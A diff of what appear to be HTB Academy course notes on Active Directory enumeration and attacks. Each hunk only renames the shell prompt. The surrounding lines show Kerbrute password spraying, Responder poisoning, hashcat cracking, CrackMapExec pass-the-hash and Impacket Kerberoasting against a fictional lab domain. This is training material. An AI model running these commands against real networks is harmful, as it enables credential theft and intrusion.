@@ -397,7 +397,7 @@ We can connect via command line using the command:
 &#x20; Introduction to Active Directory Enumeration & Attacks
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!
+root@htb[/htb]$ xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!
 ```
 
 **Connecting via SSH**
@@ -407,7 +407,7 @@ We can connect to the provided Parrot Linux attack host using the command, then 
 &#x20; Introduction to Active Directory Enumeration & Attacks
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh htb-student@<ATTACK01 target IP>
+root@htb[/htb]$ ssh htb-student@<ATTACK01 target IP>
 ```
 
 **Xfreerdp to the ATTACK01 Parrot Host**
@@ -417,7 +417,7 @@ We also installed an `XRDP` server on the `ATTACK01` host to provide GUI access 
 &#x20; Introduction to Active Directory Enumeration & Attacks
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!
+root@htb[/htb]$ xfreerdp /v:<ATTACK01 target IP> /u:htb-student /p:HTB_@cademy_stdnt!
 ```
 
 Most sections will provide credentials for the `htb-student` user on either `MS01` or `ATTACK01`. Depending on the material and challenges, some sections will have you authenticate to a target with a different user, and alternate credentials will be provided.
@@ -624,7 +624,7 @@ In the request above, we utilized `viewdns.info` to validate the IP address of o
 &#x20; External Recon and Enumeration Principles
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nslookup ns1.inlanefreight.com
+root@htb[/htb]$ nslookup ns1.inlanefreight.com
 
 Server:		192.168.186.1
 Address:	192.168.186.1#53
@@ -679,7 +679,7 @@ Note: For our purposes, the sample data below is fictional.
 &#x20; External Recon and Enumeration Principles
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
+root@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
 
 id : 5996447501
 email : roger.grimes@inlanefreight.local
@@ -817,7 +817,7 @@ If we are on a host without a GUI (which is typical), we can use [tcpdump](https
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo tcpdump -i ens224 
+root@htb[/htb]$ sudo tcpdump -i ens224 
 ```
 
 ![image](https://academy.hackthebox.com/storage/modules/143/tcpdump-example.png)
@@ -853,7 +853,7 @@ Here we'll start `fping` with a few flags: `a` to show targets that are alive, `
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ fping -asgq 172.16.5.0/23
+root@htb[/htb]$ fping -asgq 172.16.5.0/23
 
 172.16.5.5
 172.16.5.25
@@ -951,7 +951,7 @@ Our scans have provided us with the naming standard used by NetBIOS and DNS, we 
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -A 172.16.5.100
+root@htb[/htb]$ nmap -A 172.16.5.100
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-08 13:42 EDT
 Nmap scan report for 172.16.5.100
@@ -1031,7 +1031,7 @@ To get started with Kerbrute, we can download [precompiled binaries](https://git
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git
+root@htb[/htb]$ sudo git clone https://github.com/ropnop/kerbrute.git
 
 Cloning into 'kerbrute'...
 remote: Enumerating objects: 845, done.
@@ -1049,7 +1049,7 @@ Typing `make help` will show us the compiling options available.
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ make help
+root@htb[/htb]$ make help
 
 help:            Show this help.
 windows:  Make Windows x86 and x64 Binaries
@@ -1066,7 +1066,7 @@ We can choose to compile just one binary or type `make all` and compile one each
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo make all
+root@htb[/htb]$ sudo make all
 
 go: downloading github.com/spf13/cobra v1.1.1
 go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7
@@ -1095,7 +1095,7 @@ The newly created `dist` directory will contain our compiled binaries.
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls dist/
+root@htb[/htb]$ ls dist/
 
 kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
 ```
@@ -1107,7 +1107,7 @@ We can then test out the binary to make sure it works properly. We will be using
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./kerbrute_linux_amd64 
+root@htb[/htb]$ ./kerbrute_linux_amd64 
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -1134,7 +1134,7 @@ We can add the tool to our PATH to make it easily accessible from anywhere on th
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo $PATH
+root@htb[/htb]$ echo $PATH
 /home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
 ```
 
@@ -1143,7 +1143,7 @@ AbdulrahmanTamim@htb[/htb]$ echo $PATH
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+root@htb[/htb]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 ```
 
 We can now type `kerbrute` from any location on the system and will be able to access the tool. Feel free to follow along on your system and practice the above steps. Now let's run through an example of using the tool to gather an initial username list.
@@ -1153,7 +1153,7 @@ We can now type `kerbrute` from any location on the system and will be able to a
 &#x20; Initial Enumeration of the Domain
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+root@htb[/htb]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 
 2021/11/17 23:01:46 >  Using KDC(s):
 2021/11/17 23:01:46 >   172.16.5.5:88
@@ -1277,7 +1277,7 @@ Responder is a relatively straightforward tool, but is extremely powerful and ha
 &#x20; LLMNR/NBT-NS Poisoning - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ responder -h
+root@htb[/htb]$ responder -h
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -1352,7 +1352,7 @@ Any of the rogue servers (i.e., SMB) can be disabled in the `Responder.conf` fil
 &#x20; LLMNR/NBT-NS Poisoning - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 Analyzer-Session.log                Responder-Session.log
 Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
@@ -1386,7 +1386,7 @@ Once we have enough, we need to get these hashes into a usable format for us rig
 &#x20; LLMNR/NBT-NS Poisoning - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
 
@@ -1786,7 +1786,7 @@ As stated in the previous section, we can pull the domain password policy in sev
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+root@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
@@ -1827,7 +1827,7 @@ Once connected, we can issue an RPC command such as `querydominfo` to obtain inf
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
+root@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
 
 rpcclient $> querydominfo
 Domain:		INLANEFREIGHT
@@ -1886,7 +1886,7 @@ Let's try this using [enum4linux](https://labs.portcullis.co.uk/tools/enum4linux
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ enum4linux -P 172.16.5.5
+root@htb[/htb]$ enum4linux -P 172.16.5.5
 
 <SNIP>
 
@@ -1940,7 +1940,7 @@ The tool [enum4linux-ng](https://github.com/cddmp/enum4linux-ng) is a rewrite of
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
+root@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
 
 ENUM4LINUX - next generation
 
@@ -2004,7 +2004,7 @@ Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML outp
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat ilfreight.json 
+root@htb[/htb]$ cat ilfreight.json 
 
 {
     "target": {
@@ -2100,7 +2100,7 @@ With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as 
 &#x20; Enumerating & Retrieving Password Policies
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+root@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
 
 forceLogoff: -9223372036854775808
 lockoutDuration: -18000000000
@@ -2259,7 +2259,7 @@ Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include 
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+root@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 
 administrator
 guest
@@ -2288,7 +2288,7 @@ We can use the `enumdomusers` command after connecting anonymously using `rpccli
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
+root@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
 
 rpcclient $> enumdomusers 
 user:[administrator] rid:[0x1f4]
@@ -2308,7 +2308,7 @@ Finally, we can use `CrackMapExec` with the `--users` flag. This is a useful too
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
+root@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
@@ -2333,7 +2333,7 @@ We can use various tools to gather users when we find an LDAP anonymous bind. So
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+root@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 
 guest
 ACADEMY-EA-DC01$
@@ -2359,7 +2359,7 @@ Tools such as `windapsearch` make this easier (though we should still understand
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+root@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
 [+] No username provided. Will try anonymous bind.
 [+] Using Domain Controller at: 172.16.5.5
@@ -2407,7 +2407,7 @@ Let's try out this method using the [jsmith.txt](https://github.com/insidetrust/
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+root@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -2448,7 +2448,7 @@ With valid credentials, we can use any of the tools stated previously to build a
 &#x20; Password Spraying - Making a Target User List
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 
 [sudo] password for htb-student: 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -2498,7 +2498,7 @@ Let's try this out against the target environment.
 &#x20; Internal Password Spraying - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+root@htb[/htb]$ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 
 Account Name: tjohnson, Authority Name: INLANEFREIGHT
 Account Name: sgage, Authority Name: INLANEFREIGHT
@@ -2511,7 +2511,7 @@ We can also use `Kerbrute` for the same attack as discussed previously.
 &#x20; Internal Password Spraying - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+root@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -2535,7 +2535,7 @@ There are multiple other methods for performing password spraying from Linux. An
 &#x20; Internal Password Spraying - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
 ```
@@ -2547,7 +2547,7 @@ After getting one (or more!) hits with our password spraying attack, we can then
 &#x20; Internal Password Spraying - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
@@ -2570,7 +2570,7 @@ Sometimes we may only retrieve the NTLM hash for the local administrator account
 &#x20; Internal Password Spraying - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+root@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
 
 SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
 SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
@@ -2908,7 +2908,7 @@ To follow along, spawn the target at the bottom of this section and SSH to the L
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec -h
+root@htb[/htb]$ crackmapexec -h
 
 usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]
                     [--verbose]
@@ -2953,7 +2953,7 @@ We can see that we can use the tool with MSSQL, SMB, SSH, and WinRM credentials.
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ crackmapexec smb -h
+root@htb[/htb]$ crackmapexec smb -h
 
 usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k]
                         [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
@@ -3004,7 +3004,7 @@ We start by pointing CME at the Domain Controller and using the credentials for 
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
@@ -3026,7 +3026,7 @@ We can also obtain a complete listing of domain groups. We should save all of ou
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
@@ -3062,7 +3062,7 @@ We can also use CME to target other hosts. Let's check out what appears to be a 
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
 
 SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
 SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
@@ -3088,7 +3088,7 @@ We can use the `--shares` flag to enumerate available shares on the remote host 
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
@@ -3112,7 +3112,7 @@ We see several shares available to us with `READ` access. The `Department Shares
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
@@ -3128,7 +3128,7 @@ In the above command, we ran the spider against the `Department Shares`. When co
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
+root@htb[/htb]$ head -n 10 /tmp/cme_spider_plus/172.16.5.5.json 
 
 {
     "Department Shares": {
@@ -3159,7 +3159,7 @@ Like CME, we can use SMBMap and a set of domain user credentials to check for ac
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+root@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
 
 [+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
         Disk                                                  	Permissions	Comment
@@ -3181,7 +3181,7 @@ The above will tell us what our user can access and their permission levels. Lik
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+root@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
 
 [+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
         Disk                                                  	Permissions	Comment
@@ -3359,7 +3359,7 @@ Note that this shell environment is not fully interactive, so each command issue
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ windapsearch.py -h
+root@htb[/htb]$ windapsearch.py -h
 
 usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]
                        [-p PASSWORD] [--functionality] [-G] [-U] [-C]
@@ -3412,7 +3412,7 @@ We have several options with Windapsearch to perform standard enumeration (dumpi
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+root@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
 
 [+] Using Domain Controller at: 172.16.5.5
 [+] Getting defaultNamingContext from Root DSE
@@ -3444,7 +3444,7 @@ To identify more potential users, we can run the tool with the `-PU` flag and ch
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+root@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
 
 [+] Using Domain Controller at: 172.16.5.5
 [+] Getting defaultNamingContext from Root DSE
@@ -3503,7 +3503,7 @@ Running `bloodhound-python -h` from our Linux attack host will show us the optio
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ bloodhound-python -h
+root@htb[/htb]$ bloodhound-python -h
 
 usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
                          [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
@@ -3539,7 +3539,7 @@ As we can see the tool accepts various collection methods with the `-c` or `--co
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+root@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
 
 INFO: Found AD domain: inlanefreight.local
 INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
@@ -3563,7 +3563,7 @@ The command above executed Bloodhound.py with the user `forend`. We specified ou
 &#x20; Credentialed Enumeration - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ls
+root@htb[/htb]$ ls
 
 20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
 ```
@@ -5110,7 +5110,7 @@ Let's start by installing the Impacket toolkit, which we can grab from [Here](ht
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m pip install .
+root@htb[/htb]$ sudo python3 -m pip install .
 
 Processing /opt/impacket
   Preparing metadata (setup.py) ... done
@@ -5130,7 +5130,7 @@ This will install all Impacket tools and place them in our PATH so we can call t
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -h
+root@htb[/htb]$ GetUserSPNs.py -h
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -5157,7 +5157,7 @@ We can start by just gathering a listing of SPNs in the domain. To do this, we w
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+root@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -5179,7 +5179,7 @@ We can now pull all TGS tickets for offline processing using the `-request` flag
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+root@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -5208,7 +5208,7 @@ We can also be more targeted and request just the TGS ticket for a specific acco
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+root@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -5231,7 +5231,7 @@ To facilitate offline cracking, it is always good to use the `-outputfile` flag 
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+root@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
 
@@ -5248,7 +5248,7 @@ Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+root@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
 
@@ -5285,7 +5285,7 @@ We've successfully cracked the user's password as `database!`. As the last step,
 &#x20; Kerberoasting - from Linux
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+root@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
@@ -5481,7 +5481,7 @@ Next, we can take the base64 blob and remove new lines and white spaces since th
 &#x20; Kerberoasting - from Windows
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
